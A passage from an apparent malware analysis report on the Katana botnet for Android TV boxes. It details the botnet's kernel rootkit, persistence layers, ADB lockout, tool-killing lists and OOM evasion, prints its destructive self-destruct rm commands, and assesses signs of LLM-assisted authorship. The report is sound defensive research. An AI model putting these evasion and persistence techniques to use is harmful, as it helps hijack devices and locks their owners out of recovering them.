| **Syscall**  | **Effect**                                                   |
|--------------|--------------------------------------------------------------|
| `getdents`   | Hide files, directories, and processes from `ls` and `ps`    |
| `getdents64` | 64-bit variant of the above                                  |
| `kill`       | Prevent killing of protected PIDs (bot process and children) |
| `unlinkat`   | Prevent deletion of bot files                                |
| `rmdir`      | Prevent removal of bot directories                           |

*Hooked syscalls*

## Control interface

The `/proc/wlanhelper` pseudo-file accepts commands to:

- Hide/unhide specific PIDs from process listings

- Hide/unhide network ports from `/proc/net/tcp` and `/proc/net/udp`

- Hide/unhide files and directories from directory listings

- Hide/unhide Android packages from `pm list`

- Protect specific UIDs from signal delivery

The module also removes itself from `lsmod` output and the kernel's kobject hierarchy.

## Real-world effectiveness

The on-device compilation strategy addresses a real portability problem but is fragile in practice. TinyCC must compile against kernel headers present on the device, and many cheap AOSP set-top boxes ship without headers or with headers that do not match the running kernel. When compilation or `insmod` fails, the bot falls back to running without rootkit protection — fully visible to `ps`, deletable by rivals, and removable via ADB.

There is direct evidence this happens: we have observed rival operators (notably Jackskid's `komaru` stager) successfully locating and removing Katana's APK and bot processes from compromised devices. If the rootkit were reliably loading, this removal would be significantly harder — the hooked `unlinkat` and `kill` syscalls would block exactly these operations. The turf war, in other words, is an inadvertent field test of the rootkit's coverage, and the results suggest it does not load on all devices.

# Persistence



The APK wrapper (`com.system.update`) implements 5 layers of persistence, any one of which would be sufficient on its own:

1.  **AlarmManager**: schedules service restarts at 1, 2, 5, 10, and 15-minute intervals

2.  **Broadcast receivers**: 40+ intent filters including `BOOT_COMPLETED`, `LOCKED_BOOT_COMPLETED`, `QUICKBOOT_POWERON`, `CONNECTIVITY_CHANGE`, `SCREEN_ON`, `SCREEN_OFF`, `TIME_TICK`, `MEDIA_MOUNTED`, `POWER_CONNECTED`, `POWER_DISCONNECTED`, and package lifecycle events

3.  **Magisk module**: installs as `/data/adb/modules/systemupdate/` to survive factory resets

4.  **System partition**: copies to `/system/priv-app/SystemUpdate/` and `/system/bin/logd_helper`

5.  **Data partition**: backup copies in multiple locations, SysVinit scripts (`S99system`, `S99network`, `S99backup`), `install-recovery.sh` hook

## ADB lockdown

The bot remaps the ADB port from 5555 to 12341 and binds to the original port, preventing both remote management and reinfection by rival operators. This is emblematic of the ongoing competition for ADB-exposed Android TV devices: once a bot secures the ADB port, this effectively removes the device from the pool available to other botnets. The bot also kills `reboot`, `shutdown`, `poweroff`, and `halt` processes to prevent device recovery, and sets OOM score to -1000 for the bot and all child processes. Taken together, more engineering effort went into keeping the bot running than most of these devices received in firmware support.

# Anti-analysis and competitor killing



## Process masquerade

The bot selects a random name from a list of legitimate system daemons and sets it via `prctl(PR_SET_NAME)` and `/proc/self/comm`:

`udhcpc`, `inetd`, `ntpclient`, `watchdog`, `klogd`, `upnpd`, `dhclient`, `syslogd`, `crond`, `httpd`, `dropbear`, `dnsmasq`

## Library preloading

`anti_detection_init` scans `/lib`, `/usr/lib`, `/lib64` for shared libraries and memory-maps up to 10 of them. This inflates the process memory map to resemble a legitimate dynamically-linked service — the process equivalent of a fake moustache.

## Locker process

A forked child process (`locker_init`) implements what amounts to a siege: once established, nothing new runs on the device without Katana's permission.

1.  **ADB blocking**: binds to port 5555 to prevent ADB access by rival bots or investigators

2.  **PID allowlist**: builds a binary tree of all PIDs at fork time; any new process not in the tree is killed

3.  **Watchdog**: sends `SIGKILL` to parent if the locker is killed (`prctl(PR_SET_PDEATHSIG, 9)`)

## Tool blocking

The `cleanup_command_blocks` function creates blocking entries in directories with names that editorialize: `.taunt`, `.mock`, `.broken_shell`, `.hang`, alongside the more prosaic `.block`, `.reboot_block`, and `.busybox_block` under `/tmp`, `/data/local/tmp`, `/var/tmp`, and `/dev/shm`. The bot also monitors for and kills processes running any of 100+ system utilities, including:

- **Network tools**: `wget`, `curl`, `netstat`, `lsof`, `tcpdump`, `nmap`, `iftop`, `nethogs`, `telnet`, `ncat`, `netcat`, `socat`, `tftp`, `ftpget`, `rsync`, `lynx`

- **Process tools**: `htop`, `pstree`, `pidof`, `pgrep`, `killall`, `killall5`, `skill`, `strace`, `ltrace`, `lldb`, `objdump`, `hexdump`

- **System tools**: `reboot`, `shutdown`, `halt`, `poweroff`, `init`, `telinit`, `systemctl`, `service`, `insmod`, `modprobe`, `rmmod`, `lsmod`, `sysctl`, `dmesg`, `journalctl`

- **Package managers**: `apt-get`, `zypper`, `pacman`, `opkg`, `ipkg`, `dpkg`, `snap`, `flatpak`

- **Android tools**: `fastboot`, `dumpsys`, `logcat`, `bugreport`, `dumpstate`, `screencap`, `screenrecord`

- **Scripting**: `bash`, `dash`, `perl`, `python`, `python3`, `ruby`

- **File utilities**: `find`, `head`, `tail`, `strings`, `sort`, `uniq`, `mount`, `umount`, `chmod`, `chown`

The bot also detects and kills shell scripts that enumerate `/proc` looking for bot processes, matching 22 distinct patterns including `for pid in /proc/`, `ps aux.*grep`, `lsof.*deleted`, and `proc.*exe.*2>/dev/null`.

## Process killer

`killer_clean_tmp` scans `/proc` and kills processes whose binary is located in temporary directories (`/tmp`, `/dev/shm`, `/var/run`, `/data/local/tmp`, `/cache`, `/sdcard`) or whose filename matches architecture strings (`arm`, `mips`, `mipsel`, `powerpc`, `x86_32`, `x86_64`, `sparc`, `dropper`). The bot allowlists the string `systemdd-worker`.

`killer_clean_mnt` scans `/proc/mounts` for bind-mounted processes and kills them.

## OOM evasion

Writes `-1000` to `/proc/self/oom_score_adj` and `-17` to `/proc/self/oom_adj` to prevent the kernel OOM killer from terminating the bot. This is the lowest score the kernel accepts — under memory pressure, the kernel will terminate the device's actual purpose (streaming video) before it considers touching the bot.

## Self-destruct

If the C2 goes silent, Katana cleans up after itself. A dead-man's-switch self-destruct is standard in Mirai derivatives, but Katana's is unusually thorough: it removes SysVinit scripts, cron jobs, bot binaries, and monitor processes across every persistence path it created. Whatever else one might say about the author, they do not leave a mess.

If C2 is unreachable for 3 days (259,200 seconds), the bot removes all persistence artifacts and exits:

    rm -f /var/.update /var/tmp/.update /var/log/.update ...
    rm -f /etc/init.d/S99system /etc/init.d/S99network ...
    rm -f /etc/rc*.d/S99system /etc/rc*.d/S99network ...
    rm -f /var/.monitor /var/tmp/.monitor /tmp/.monitor ...
    killall -9 .update .monitor
    crontab -r
    rm -f /var/spool/cron/crontabs/root /var/spool/cron/root
    rm -f /etc/cron.d/root /etc/crontabs/root

This reveals the persistence file names: `.update` and `.monitor` deployed to multiple directories.

# APK IPC mechanism



The bot binary communicates with its APK wrapper through file-based IPC in `/data/local/tmp/`:

| **File** | **Purpose** |
|----|----|
| `.bot_hb` | Heartbeat — bot writes timestamp, APK reads to confirm bot is alive |
| `.bot_ipc` | Liveness — APK creates, bot reads to confirm APK is alive |
| `.bot_errors` | Error drain — bot reads and deletes error messages from APK |

*IPC files*

The `apk_ipc_watchdog` function monitors the APK wrapper and restarts it (via `am startservice`, `am start-foreground-service`, `am broadcast`, and `su -c am startservice`) if it detects the APK has died. This creates a mutual watchdog: the APK restarts the bot if it dies, and the bot restarts the APK if it dies. Neither can be removed without first removing the other, a bootstrap problem familiar to anyone who has tried to clean a persistent infection.

# Scanner and propagation



**This binary contains no scanner.** Despite inheriting Mirai table entries for telnet credentials (`enable`, `shell`, `xrx.nf`) and the Busybox probe string (`/bin/busybox MIRAI`), there is no telnet scanner function, no credential loop, no port-scanning logic, and no propagation code.

The scanner report domain (`satyr[.]wtf:48101`) is configured in the table but has no supporting code to generate reports.

In all observed samples, external ADB dropper scripts handle propagation (see [Delivery chain](#delivery-chain)) rather than built-in scanning. This separation of payload and delivery is increasingly common across botnet families. The presence of x86 binaries in the APK suggests other delivery methods may exist beyond ADB exploitation.

# AI-assistance assessment



Several features of the binary suggest that the developers built portions of the code with large language model (LLM) assistance. While definitive attribution is not possible from compiled output alone, the following indicators form a pattern consistent with AI-augmented development.

## Strong indicators

### Tool blocking list includes shell builtins

The bot attempts to block over 99 system utilities by killing matching processes. However, the list includes `echo`, `printf`, `test`, `true`, `false`, `export`, `unset`, and `alias`, which are shell builtins that execute within the shell process itself and cannot be blocked by killing processes. This distinction between builtins and external commands is fundamental to Unix systems programming. An LLM generating a comprehensive "list of Linux commands" would include both categories indiscriminately.

### Categorical organization, not threat prioritization

The authors organized the blocked tool list by functional category (network monitoring → process management → Android forensics → file search → text processing → filesystem → …) rather than by likelihood of use or threat level. This taxonomic organization is characteristic of LLM-generated lists, which default to categorical enumeration.

### Platform-irrelevant tools

The list blocks tools that do not exist on the target platform (Android TV boxes running Android 9):

- `zypper` (SUSE-only package manager)

- `pacman` (Arch Linux-only)

- `snap`, `flatpak` (desktop Linux only)

- `emacs` (not typically present on embedded devices)

- `lldb` (LLVM debugger, not shipped with Android)

- `chkconfig` (Red Hat-specific)

- `update-rc.d` (Debian-specific)

These tools have no installation path on Android TV. An LLM asked to enumerate "all Linux system administration tools" would include them regardless of platform relevance.

### SMTP relay placeholder hostnames

The SMTP flood attack uses the following relay targets:

    mail.server.local
    smtp.domain.net
    mx1.host.org
    relay.mail.com

These are documentation-style placeholder hostnames. `mail.server.local` uses the `.local` TLD reserved for mDNS (RFC 6762), meaning it cannot resolve via standard DNS and would never appear in a production mail configuration. Real SMTP flood implementations use either randomly generated domains or harvested real mail servers.

### Exhaustive anti-forensic shell patterns

The bot monitors for and kills shell scripts that enumerate `/proc`, matching 22 distinct patterns including multiple bash parameter expansion variants:

    ${p##*/}       pid=${p
    /proc/${pid}/exe    /proc/$pid/exe
    proc.*exe.*2>/dev/null
    stat.*proc.*exe    file.*proc.*exe

This is not a list compiled from encountering specific analysis scripts. It is a systematic enumeration of every plausible way to write a proc-scanning one-liner, the kind of exhaustive coverage that results from asking an LLM to generate comprehensive detection patterns.

### IRC command selection

The IRC flood uses `NICK`, `USER`, `PING`, `WHO`, `LIST`, `LUSERS`, `VERSION`, which reads like a "common IRC commands" reference list rather than a selection optimized for server resource consumption. Several of these commands impose minimal load on modern IRC daemons.

## Moderate indicators

### Domain encryption design

The 5-step domain cipher (reverse → bit-rotate → XOR → chain XOR → running subtract) stacks five simple, individually trivial transformations. Each step is immediately reversible. This "more steps = more secure" approach is characteristic of LLM-generated cryptography, which tends to add complexity without adding security. Compare to Jackskid's RC4 variant, which uses a modified KSA, LCG mixing, and LFSR feedback.

### Unusually clean code organization

The authors structured the bot into 14 well-named single-responsibility source files (`anti_detection.c`, `apk_ipc.c`, `attack.c`, `attack_http.c`, `attack_tcp.c`, `attack_udp.c`, `checksum.c`, `domain_persist.c`, `hardcoded_domains.c`, `locker.c`, `persistence.c`, `resolv.c`, `throttler.c`, `watchdog.c`). This is unusually well-organized for a Mirai fork (typical derivatives have 3–5 monolithic source files with inconsistent naming). The clean separation of concerns may reflect LLM-assisted code scaffolding.

### PuTTY version range

The SSH banner spoofing uses PuTTY versions 0.79 through 0.83 in sequential order. All five versions are real releases (0.83 was released 2025-02-08), so the version strings are accurate rather than fabricated. However, the perfectly sequential and complete enumeration of recent PuTTY releases is characteristic of an LLM-generated list. A contiguous range of every release is more suggestive of automated enumeration than manual selection.

## Indicators against AI-only development

Several aspects of the binary remain difficult to produce with LLMs as of early 2026, though this boundary shifts rapidly:

- **Mirai build system**: uses the Aboriginal Linux cross-compilation environment (`/home/landley/aboriginal/`) with GCC 4.2.1 + uClibc, the same toolchain as the original Mirai source. Configuring this build system requires familiarity with embedded cross-compilation that LLMs do not yet handle well as of early 2026.

- **Kernel rootkit**: the `wlan_helper.ko` module hooks 5 syscalls via function pointer replacement in the system call table. Producing a working loadable kernel module that handles varying kernel versions is beyond what LLMs have demonstrated generating reliably as of early 2026.

- **APK IPC design**: the mutual watchdog between bot and APK (file-based heartbeat + service restart) is a functional architecture that handles edge cases correctly.

- **FiveM API calls**: the CitizenFX attack templates use real API method names (`getEndpoints`, `getConfiguration`, `X-CitizenFX-Token`) that would require either FiveM development experience or careful documentation review.

- **Chrome user-agent accuracy**: the per-platform Chrome 144 version numbers (7559.111 Windows, 7559.109 Linux, 7559.110 Android) are accurate down to the patch level, suggesting real version research rather than fabrication.

## Assessment

The most likely development model is a **developer using AI to generate tedious list-based components** (tool blocklists, anti-forensic patterns, protocol payload templates) while writing the core architecture, rootkit, and C2 protocol themselves. This is not surprising: AI-assisted software development has become widespread since late 2025, and there is no reason to expect malware authors to be an exception. The pattern here mirrors what we observe across the broader software ecosystem, where AI accelerates boilerplate generation while humans handle the components that require domain-specific understanding.

The AI-generated components are identifiable because they prioritize completeness over relevance: blocking `emacs` on Android TV, monitoring for obscure bash parameter expansion variants, and flooding SMTP placeholders that cannot resolve via DNS are all technically valid but operationally inert.

# Detection

Detection rules and host indicators are in [`detection/`](detection/):

| File | Contents |
|------|----------|
| [`katana.yar`](detection/katana.yar) | YARA rule for ELF binary detection |
| [`host_indicators.csv`](detection/host_indicators.csv) | Filesystem paths and artifacts for host-based detection |

# Indicators of compromise

Machine-readable IOC files are in [`iocs/`](iocs/):

| File | Contents |
|------|----------|
| [`hashes.csv`](iocs/hashes.csv) | SHA256 hashes for APK, bot binaries, rootkit components |
| [`domains.csv`](iocs/domains.csv) | C2 domains and scanner report domains |
| [`ips.csv`](iocs/ips.csv) | C2 IPs, staging servers, fallback infrastructure |
| [`keys.csv`](iocs/keys.csv) | Cryptographic keys and APK certificate indicators |

## Edit history

| Date | Change |
|------|--------|
| 2026-03-17 | Initial public release |
| 2026-03-18 | Added HTTP flood details: no TLS stack, no JA3/JA4 fingerprint, UA pool |
